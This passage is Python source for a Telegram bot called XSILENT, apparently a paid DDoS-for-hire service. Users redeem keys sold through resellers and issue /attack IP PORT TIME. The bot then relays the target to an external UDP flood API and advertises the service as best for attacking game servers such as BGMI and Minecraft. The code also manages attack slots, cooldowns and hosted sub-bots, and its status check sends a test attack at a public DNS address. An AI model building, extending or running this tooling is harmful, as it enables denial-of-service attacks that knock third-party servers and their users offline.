            bot.reply_to(msg, "⚠️ Usage: /attack IP PORT\n📌 Example: /attack 1.1.1.1 443")
            return
        ip, port = args[1], args[2]
        duration = attack_time_limit
    else:
        if len(args) != 4:
            bot.reply_to(msg, "⚠️ Usage: /attack IP PORT TIME\n📌 Example: /attack 1.1.1.1 443 60")
            return
        ip, port, duration = args[1], args[2], args[3]
        try:
            duration = int(duration)
        except:
            bot.reply_to(msg, "❌ Invalid time!")
            return
    if not validate_ip(ip):
        bot.reply_to(msg, "❌ Invalid IP address!")
        return
    try:
        port = int(port)
        if duration < 10 or duration > attack_time_limit:
            bot.reply_to(msg, f"❌ Duration must be 10-{attack_time_limit} seconds!")
            return
    except:
        bot.reply_to(msg, "❌ Invalid port!")
        return
    existing_attack = check_active_attack_by_target(ip, port)
    if existing_attack:
        remaining = int(existing_attack["finish_time"] - time.time())
        bot.reply_to(msg, f"❌ TARGET UNDER ATTACK!\n\n🎯 {ip}:{port} already being attacked\n👤 By: {existing_attack['user']}\n⏰ Finishes in: {remaining}s")
        return
    if not is_group:
        cooldown[uid] = time.time()
    attack_id = f"{uid}_{int(time.time())}_{random.randint(1000, 9999)}"
    target_key = f"{ip}:{port}"
    finish_time = time.time() + duration
    active_attacks[attack_id] = {
        "user": uid,
        "finish_time": finish_time,
        "ip": ip,
        "port": port,
        "target_key": target_key,
        "start_time": time.time()
    }
    new_total = get_total_active_count()
    current_time = format_ist_time(get_current_ist())
    bot.reply_to(msg, f"✨ ATTACK LAUNCHED! ✨\n\n🎯 Target: {ip}:{port}\n⏱️ Duration: {duration}s\n⚡ Method: UDP (Auto)\n📅 Time: {current_time}\n🌐 Global Active: {new_total}/{MAX_CONCURRENT}\n🔄 Sending to API...")
    def run():
        send_attack_to_api(ip, port, duration, msg.chat.id, bot, is_hosted=False)
        if attack_id in active_attacks:
            del active_attacks[attack_id]
    threading.Thread(target=run).start()

@bot.message_handler(commands=['status'])
def status(msg):
    uid = str(msg.chat.id)
    if check_maintenance():
        bot.reply_to(msg, "🔧 Maintenance!")
        return
    if uid not in users and uid not in ADMIN_ID and uid not in resellers:
        bot.reply_to(msg, "❌ Unauthorized!")
        return
    slots_status = format_attack_status()
    main_active = get_main_active_count()
    total_active = get_total_active_count()
    current_time = format_ist_time(get_current_ist())
    status_msg = f"📊 MAIN BOT SLOT STATUS\n📅 {current_time}\n\n"
    status_msg += "\n\n".join(slots_status)
    status_msg += f"\n\n📊 MAIN BOT ACTIVE: {main_active}/{MAX_CONCURRENT}\n"
    hosted_attacks_exist = False
    hosted_attacks_list = []
    for token, info in hosted_bots.items():
        now = time.time()
        for aid, ainfo in info.get("active_attacks", {}).items():
            if now < ainfo["finish_time"]:
                remaining = int(ainfo["finish_time"] - now)
                mins = remaining // 60
                secs = remaining % 60
                time_str = f"{mins}m {secs}s" if mins > 0 else f"{secs}s"
                hosted_attacks_list.append(f"🎯 {ainfo['target_key']}\n└ 👤 {ainfo['user']}\n└ 🤖 Bot: {info.get('owner_name', 'HOSTED')}\n└ ⏰ {time_str} left")
                hosted_attacks_exist = True

    if hosted_attacks_exist:
        status_msg += f"\n\n📊 HOSTED BOT ATTACKS\n\n" + "\n\n".join(hosted_attacks_list)

    status_msg += f"\n\n🌐 TOTAL GLOBAL ACTIVE: {total_active}/{MAX_CONCURRENT}"
    if total_active >= MAX_CONCURRENT:
        status_msg += f"\n❌ LIMIT REACHED! No more attacks can start."
    else:
        status_msg += f"\n✅ {MAX_CONCURRENT - total_active} slots available globally"

    if uid in cooldown:
        remaining = COOLDOWN_TIME - (time.time() - cooldown[uid])
        if remaining > 0:
            status_msg += f"\n\n⏳ YOUR COOLDOWN: {int(remaining)}s"

    bot.reply_to(msg, status_msg)

@bot.message_handler(commands=['host'])
def host_bot(msg):
    uid = str(msg.chat.id)
    if check_maintenance():
        bot.reply_to(msg, "🔧 Maintenance!")
        return
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    args = msg.text.split()
    if len(args) != 5:
        bot.reply_to(msg, "⚠️ Usage: /host BOT_TOKEN USER_ID CONCURRENT NAME\n📌 Concurrent: 1-20\n📌 Example: /host 123456:ABC 8487946379 10 MONSTER")
        return
    bot_token = args[1]
    owner_id = args[2]
    try:
        concurrent = int(args[3])
        if concurrent < 1 or concurrent > 20:
            bot.reply_to(msg, "❌ Concurrent must be between 1 and 20!")
            return
    except:
        bot.reply_to(msg, "❌ Invalid concurrent value!")
        return
    owner_name = args[4]
    hosted_bots[bot_token] = {
        "owner_id": owner_id,
        "owner_name": owner_name,
        "concurrent": concurrent,
        "blocked": False,
        "active_attacks": {},
        "users": [],
        "resellers": []
    }
    save_hosted_bots(hosted_bots)
    if start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
        current_time = format_ist_time(get_current_ist())
        bot.reply_to(msg, f"✅ HOSTED BOT STARTED!\n\n🔑 Token: {bot_token[:20]}...\n👑 Owner: {owner_id}\n📛 Name: {owner_name}\n⚡ Concurrent: {concurrent}\n🌐 Global Limit: {MAX_CONCURRENT}\n📅 Started at: {current_time}\n\n💡 Bot is now live!")
    else:
        bot.reply_to(msg, "❌ Failed to start hosted bot! Check token and try again.")

@bot.message_handler(commands=['unhost'])
def unhost_bot(msg):
    uid = str(msg.chat.id)
    if check_maintenance():
        bot.reply_to(msg, "🔧 Maintenance!")
        return
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /unhost BOT_TOKEN")
        return
    bot_token = args[1]
    if bot_token in hosted_bots or bot_token in hosted_bot_instances:
        stop_hosted_bot(bot_token)
        bot.reply_to(msg, f"✅ HOSTED BOT STOPPED!\n\n🔑 Token: {bot_token[:20]}...\n💡 Bot is now completely offline.")
    else:
        bot.reply_to(msg, "❌ Hosted bot not found!")

@bot.message_handler(commands=['allhosts'])
def all_hosts(msg):
    if check_maintenance():
        bot.reply_to(msg, "🔧 Maintenance!")
        return
    if str(msg.chat.id) not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    host_list = []
    for token, info in hosted_bots.items():
        status = "🔴 BLOCKED" if info.get("blocked", False) else "🟢 ACTIVE"
        host_list.append(f"🔑 {token[:20]}...\n└ 👑 Owner: {info['owner_id']}\n└ 📛 Name: {info['owner_name']}\n└ ⚡ Concurrent: {info['concurrent']}\n└ {status}")
    if host_list:
        bot.reply_to(msg, f"📋 ALL HOSTED BOTS:\n\n" + "\n\n".join(host_list) + f"\n\n📊 Total: {len(hosted_bots)}")
    else:
        bot.reply_to(msg, "📋 No hosted bots found!")

@bot.message_handler(commands=['maintenance'])
def maintenance(msg):
    uid = str(msg.chat.id)
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /maintenance on or /maintenance off")
        return
    global maintenance_mode
    status = args[1].lower()
    if status == "on":
        maintenance_mode = True
        bot.reply_to(msg, "🔧 MAINTENANCE MODE ENABLED 🔧\n\nBot commands are now disabled.\nUse /maintenance off to disable.")
    elif status == "off":
        maintenance_mode = False
        bot.reply_to(msg, "✅ MAINTENANCE MODE DISABLED ✅\n\nBot is now fully operational!")
    else:
        bot.reply_to(msg, "❌ Invalid status! Use on or off")

@bot.message_handler(commands=['removekey'])
def remove_key(msg):
    uid = str(msg.chat.id)
    if check_maintenance():
        bot.reply_to(msg, "🔧 Maintenance!")
        return
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /removekey KEY")
        return
    key = args[1]
    if key not in keys_data:
        bot.reply_to(msg, "❌ Key not found!")
        return
    del keys_data[key]
    save_keys(keys_data)
    bot.reply_to(msg, f"✅ KEY REMOVED!\n🔑 Key: {key}")

@bot.message_handler(commands=['genkey'])
def genkey(msg):
    uid = str(msg.chat.id)
    if check_maintenance():
        bot.reply_to(msg, "🔧 Maintenance!")
        return
    if uid not in ADMIN_ID and uid not in resellers:
        bot.reply_to(msg, "❌ Admin or Reseller only!")
        return
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /genkey 1 or /genkey 5h")
        return
    value, unit = parse_duration(args[1])
    if value is None:
        bot.reply_to(msg, "❌ Invalid! Use 1 or 5h")
        return
    key = generate_key()
    expires_at = get_expiry_date(value, unit)
    keys_data[key] = {"user_id": "pending", "duration_value": value, "duration_unit": unit, "generated_by": uid, "generated_at": time.time(), "expires_at": expires_at.timestamp(), "used": False}
    save_keys(keys_data)
    expiry_str = expires_at.strftime('%d %b %Y, %I:%M %p')
    bot.reply_to(msg, f"✅ KEY GENERATED!\n\n🔑 Key: `{key}`\n⏰ Duration: {format_duration(value, unit)}\n📅 Expires: {expiry_str}\n\nUser: /redeem {key}")

@bot.message_handler(commands=['add'])
def add_user(msg):
    uid = str(msg.chat.id)
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /add USER_ID")
        return
    new_user = args[1]
    if new_user in ADMIN_ID:
        bot.reply_to(msg, "❌ Cannot add owner!")
        return
    if new_user in users:
        bot.reply_to(msg, f"❌ User {new_user} already has access!")
        return
    users.append(new_user)
    users_data["users"] = users
    save_users(users_data)
    bot.reply_to(msg, f"✅ USER ADDED!\n👤 User: {new_user}")

@bot.message_handler(commands=['remove'])
def remove_user(msg):
    uid = str(msg.chat.id)
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /remove USER_ID")
        return
    target_user = args[1]
    if target_user in ADMIN_ID:
        bot.reply_to(msg, "❌ Cannot remove owner!")
        return
    if target_user not in users:
        bot.reply_to(msg, f"❌ User {target_user} not found!")
        return
    users.remove(target_user)
    users_data["users"] = users
    save_users(users_data)
    bot.reply_to(msg, f"✅ USER REMOVED!\n👤 User: {target_user}")

@bot.message_handler(commands=['addreseller'])
def add_reseller(msg):
    uid = str(msg.chat.id)
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /addreseller USER_ID")
        return
    new_reseller = args[1]
    if new_reseller in ADMIN_ID:
        bot.reply_to(msg, "❌ Cannot add owner!")
        return
    if new_reseller in resellers:
        bot.reply_to(msg, f"❌ User {new_reseller} is already a reseller!")
        return
    resellers.append(new_reseller)
    if new_reseller not in users:
        users.append(new_reseller)
    users_data["users"] = users
    users_data["resellers"] = resellers
    save_users(users_data)
    bot.reply_to(msg, f"✅ RESELLER ADDED!\n👤 Reseller: {new_reseller}")

@bot.message_handler(commands=['removereseller'])
def remove_reseller(msg):
    uid = str(msg.chat.id)
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /removereseller USER_ID")
        return
    target = args[1]
    if target not in resellers:
        bot.reply_to(msg, f"❌ User {target} is not a reseller!")
        return
    resellers.remove(target)
    users_data["resellers"] = resellers
    save_users(users_data)
    bot.reply_to(msg, f"✅ RESELLER REMOVED!\n👤 User: {target}")

@bot.message_handler(commands=['addgroup'])
def add_group(msg):
    uid = str(msg.chat.id)
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    args = msg.text.split()
    if len(args) != 3:
        bot.reply_to(msg, "⚠️ Usage: /addgroup GROUP_ID TIME\n📌 Example: /addgroup -100123456789 60")
        return
    group_id = args[1]
    try:
        attack_time = int(args[2])
        if attack_time < 10 or attack_time > 300:
            bot.reply_to(msg, "❌ Attack time must be 10-300 seconds!")
            return
    except:
        bot.reply_to(msg, "❌ Invalid time!")
        return
    groups[group_id] = {"attack_time": attack_time, "added_by": uid, "added_at": time.time()}
    save_groups(groups)
    bot.reply_to(msg, f"✅ GROUP ADDED!\n👥 Group ID: {group_id}\n⏱️ Attack Time: {attack_time}s")

@bot.message_handler(commands=['removegroup'])
def remove_group_cmd(msg):
    uid = str(msg.chat.id)
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /removegroup GROUP_ID")
        return
    group_id = args[1]
    if group_id in groups:
        del groups[group_id]
        save_groups(groups)
        bot.reply_to(msg, f"✅ GROUP REMOVED!\n👥 Group ID: {group_id}")
    else:
        bot.reply_to(msg, "❌ Group not found!")

@bot.message_handler(commands=['allgroups'])
def all_groups(msg):
    if str(msg.chat.id) not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    group_list = []
    for group_id, info in groups.items():
        group_list.append(f"👥 {group_id}\n└ ⏱️ {info['attack_time']}s\n└ 👑 {info['added_by']}")
    if group_list:
        bot.reply_to(msg, f"📋 ALL GROUPS:\n\n" + "\n\n".join(group_list) + f"\n\nTotal: {len(groups)}")
    else:
        bot.reply_to(msg, "📋 No groups added yet!")

@bot.message_handler(commands=['redeem'])
def redeem(msg):
    uid = str(msg.chat.id)
    if check_maintenance():
        bot.reply_to(msg, "🔧 Maintenance!")
        return
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /redeem KEY")
        return
    key = args[1]
    if key not in keys_data:
        bot.reply_to(msg, "❌ Invalid key!")
        return
    key_info = keys_data[key]
    if key_info.get("used", False):
        bot.reply_to(msg, "❌ Key already used!")
        return
    if time.time() > key_info["expires_at"]:
        bot.reply_to(msg, "❌ Key expired!")
        del keys_data[key]
        save_keys(keys_data)
        return
    if uid not in users:
        users.append(uid)
        users_data["users"] = users
        save_users(users_data)
    keys_data[key]["used"] = True
    keys_data[key]["used_at"] = time.time()
    keys_data[key]["used_by"] = uid
    save_keys(keys_data)
    expiry_str = datetime.fromtimestamp(key_info['expires_at']).strftime('%d %b %Y, %I:%M %p')
    duration_display = format_duration(key_info['duration_value'], key_info['duration_unit'])
    bot.reply_to(msg, f"✅ ACCESS GRANTED!\n\n🎉 User {uid} activated!\n⏰ Duration: {duration_display}\n📅 Expires: {expiry_str}\n⚡ Total Concurrent: {MAX_CONCURRENT}\n⏳ Cooldown: {COOLDOWN_TIME}s\n\n🛒 Buy: XSILENT")

@bot.message_handler(commands=['mykeys'])
def mykeys(msg):
    uid = str(msg.chat.id)
    if check_maintenance():
        bot.reply_to(msg, "🔧 Maintenance!")
        return
    if uid not in ADMIN_ID and uid not in resellers:
        bot.reply_to(msg, "❌ Unauthorized!")
        return
    my_generated_keys = []
    for key, info in keys_data.items():
        if info.get("generated_by") == uid and not info.get("used", False):
            expires = datetime.fromtimestamp(info["expires_at"]).strftime('%d %b %Y, %I:%M %p')
            duration_display = format_duration(info['duration_value'], info['duration_unit'])
            my_generated_keys.append(f"🔑 {key}\n   ⏰ {duration_display}\n   📅 Expires: {expires}")
    if my_generated_keys:
        bot.reply_to(msg, f"📋 YOUR GENERATED KEYS:\n\n" + "\n\n".join(my_generated_keys))
    else:
        bot.reply_to(msg, f"📋 No keys generated yet!\n\n🛒 Buy: XSILENT")

@bot.message_handler(commands=['broadcast'])
def broadcast(msg):
    uid = str(msg.chat.id)
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    all_broadcast_users = [u for u in broadcast_users]
    if msg.reply_to_message:
        success_count = 0
        fail_count = 0
        caption = msg.text.split(maxsplit=1)[1] if len(msg.text.split(maxsplit=1)) > 1 else ""
        for user in all_broadcast_users:
            try:
                if msg.reply_to_message.photo:
                    bot.send_photo(user, msg.reply_to_message.photo[-1].file_id, caption=caption)
                elif msg.reply_to_message.video:
                    bot.send_video(user, msg.reply_to_message.video.file_id, caption=caption)
                else:
                    bot.send_message(user, caption)
                success_count += 1
            except:
                fail_count += 1
        bot.reply_to(msg, f"✅ BROADCAST SENT!\n✅ Success: {success_count} users\n❌ Failed: {fail_count} users")
    else:
        args = msg.text.split(maxsplit=1)
        if len(args) != 2:
            bot.reply_to(msg, "⚠️ Usage: /broadcast MESSAGE\n💡 Or reply to a photo/video with caption")
            return
        message = args[1]
        success_count = 0
        fail_count = 0
        for user in all_broadcast_users:
            try:
                bot.send_message(user, f"📢 BROADCAST MESSAGE 📢\n\n{message}\n\n🛒 Buy: XSILENT")
                success_count += 1
            except:
                fail_count += 1
        bot.reply_to(msg, f"✅ BROADCAST SENT!\n✅ Success: {success_count} users\n❌ Failed: {fail_count} users")

@bot.message_handler(commands=['stopattack'])
def stop_attack(msg):
    uid = str(msg.chat.id)
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /stopattack IP:PORT")
        return
    target = args[1]
    stopped = False
    for attack_id, info in list(active_attacks.items()):
        if info["target_key"] == target:
            del active_attacks[attack_id]
            stopped = True
            bot.reply_to(msg, f"✅ ATTACK STOPPED!\n🎯 Target: {target}\n👤 Attacker: {info['user']}")
            try:
                bot.send_message(info['user'], f"⚠️ Your attack on {target} was stopped by owner!")
            except:
                pass
            break
    if not stopped:
        for token, bot_info in hosted_bots.items():
            for attack_id, info in list(bot_info.get("active_attacks", {}).items()):
                if info["target_key"] == target:
                    del bot_info["active_attacks"][attack_id]
                    save_hosted_bots(hosted_bots)
                    stopped = True
                    bot.reply_to(msg, f"✅ ATTACK STOPPED!\n🎯 Target: {target}\n👤 Attacker: {info['user']}\n🤖 Bot: {bot_info.get('owner_name', 'HOSTED')}")
                    try:
                        bot.send_message(info['user'], f"⚠️ Your attack on {target} was stopped by owner!")
                    except:
                        pass
                    break
            if stopped:
                break
    if not stopped:
        bot.reply_to(msg, f"❌ No active attack found on {target}")

@bot.message_handler(commands=['methods'])
def methods(msg):
    uid = str(msg.chat.id)
    chat_type = msg.chat.type
    if check_maintenance():
        bot.reply_to(msg, "🔧 Maintenance!")
        return
    if chat_type == "group" or chat_type == "supergroup":
        bot.reply_to(msg, f"⚡ UDP AUTO ATTACK\n\n💡 Best for gaming\n🎯 Recommended ports: 443, 8080\n\n📌 USAGE:\n/attack IP PORT")
    elif uid in users or uid in ADMIN_ID or uid in resellers:
        bot.reply_to(msg, f"⚡ UDP AUTO ATTACK\n\n💡 Best for gaming (BGMI, Minecraft)\n🎯 Recommended ports: 443, 8080, 14000\n\n📌 USAGE:\n/attack IP PORT TIME\n\n📌 Example: /attack 1.1.1.1 443 60\n\n🛒 Buy: XSILENT")
    else:
        bot.reply_to(msg, "❌ Unauthorized!")

@bot.message_handler(commands=['stats'])
def stats(msg):
    uid = str(msg.chat.id)
    if check_maintenance():
        bot.reply_to(msg, "🔧 Maintenance!")
        return
    if uid not in users and uid not in ADMIN_ID and uid not in resellers:
        bot.reply_to(msg, "❌ Unauthorized!")
        return
    has_active = check_user_expiry(uid)
    status_text = "Active" if has_active else "Expired"
    cooldown_text = "Yes" if uid in cooldown else "No"
    if uid in cooldown:
        remaining = COOLDOWN_TIME - (time.time() - cooldown[uid])
        if remaining > 0:
            cooldown_text = f"{int(remaining)}s left"
    total_active = get_total_active_count()
    bot.reply_to(msg, f"📊 YOUR STATS\n\n👤 ID: {uid}\n✅ Status: {status_text}\n⏳ Cooldown: {cooldown_text}\n🌐 Global Active: {total_active}/{MAX_CONCURRENT}\n\n🛒 Buy: XSILENT")

@bot.message_handler(commands=['help'])
def help_cmd(msg):
    uid = str(msg.chat.id)
    chat_type = msg.chat.type
    current_time = format_ist_time(get_current_ist())
    if check_maintenance():
        bot.reply_to(msg, "🔧 Maintenance!")
        return
    if chat_type == "group" or chat_type == "supergroup":
        bot.reply_to(msg, f"✨ XSILENT GROUP HELP ✨\n\n📝 COMMANDS:\n/attack IP PORT - Launch attack\n/help - This menu\n/start - Bot info\n📅 {current_time}")
    elif uid in ADMIN_ID:
        bot.reply_to(msg, f"""👑 XSILENT OWNER HELP 👑

📝 COMMANDS:

/attack IP PORT TIME - Launch attack
/status - Check slots
/cooldown - Check your cooldown
/setmax 1-100 - Set global concurrent limit
/setcooldown 1-300 - Set cooldown time

/genkey 1 or 5h - Generate key
/removekey KEY - Remove key

/add USER - Add user
/remove USER - Remove user
/addreseller USER - Add reseller
/removereseller USER - Remove reseller

/addgroup GROUP_ID TIME - Add group
/removegroup GROUP_ID - Remove group

/host BOT_TOKEN USER_ID CONCURRENT NAME - Host bot
/unhost BOT_TOKEN - Remove hosted bot

/maintenance on/off - Maintenance mode
/broadcast - Broadcast (text/photo/video)
/stopattack IP:PORT - Stop attack
/allusers - List users
/allgroups - List groups
/allhosts - List hosted bots
/api_status - API status

⚡ Global Concurrent: {MAX_CONCURRENT}
⏳ Cooldown: {COOLDOWN_TIME}s
📅 Server Time: {current_time}
🛒 Buy: XSILENT""")
    elif uid in resellers:
        bot.reply_to(msg, f"""💎 XSILENT RESELLER HELP 💎

📝 COMMANDS:

/attack IP PORT TIME - Launch attack
/status - Check slots
/cooldown - Check your cooldown
/genkey 1 or 5h - Generate key
/mykeys - Your keys

⚡ Global Concurrent: {MAX_CONCURRENT}
⏳ Cooldown: {COOLDOWN_TIME}s
📅 Server Time: {current_time}
🛒 Buy: XSILENT""")
    elif uid in users:
        bot.reply_to(msg, f"""🔥 XSILENT USER HELP 🔥

📝 COMMANDS:

/attack IP PORT TIME - Launch attack
/status - Check slots
/cooldown - Check your cooldown
/redeem KEY - Activate key

⚡ Global Concurrent: {MAX_CONCURRENT}
⏳ Cooldown: {COOLDOWN_TIME}s
📅 Server Time: {current_time}
🛒 Buy: XSILENT""")
    else:
        bot.reply_to(msg, f"❌ Unauthorized!\n\nUse /redeem KEY to activate\n📅 Server Time: {current_time}\n\n🛒 Buy: XSILENT")

@bot.message_handler(commands=['allusers'])
def all_users(msg):
    if str(msg.chat.id) not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    user_list = []
    for u in users:
        if u in ADMIN_ID:
            role = "👑 OWNER"
        elif u in resellers:
            role = "💎 RESELLER"
        else:
            role = "👤 USER"
        user_list.append(f"{role}: {u}")
    bot.reply_to(msg, f"📋 ALL USERS:\n\n" + "\n".join(user_list) + f"\n\nTotal: {len(users)}")

@bot.message_handler(commands=['api_status'])
def api_status(msg):
    if str(msg.chat.id) not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    try:
        test_response = requests.get(f"{API_URL}?api_key={API_KEY}&target=8.8.8.8&port=80&time=5&concurrent=1", timeout=5)
        api_status_text = "Online" if test_response.status_code == 200 else "Offline"
        bot.reply_to(msg, f"✅ API STATUS\n\n📡 Status: {api_status_text}\n🎯 Active Attacks: {get_total_active_count()}\n📅 {format_ist_time(get_current_ist())}")
    except:
        bot.reply_to(msg, "❌ API OFFLINE")

print("=" * 50)
print("✨ XSILENT BOT STARTED ✨")
print(f"👑 Owner: 8487946379")
print(f"⚡ Global Concurrent: {MAX_CONCURRENT}")
print(f"⏳ Cooldown: {COOLDOWN_TIME}s")
print(f"📊 Hosted Bots: {len(hosted_bots)}")
print(f"📅 Server Time: {format_ist_time(get_current_ist())}")
print("=" * 50)

bot.infinity_polling()
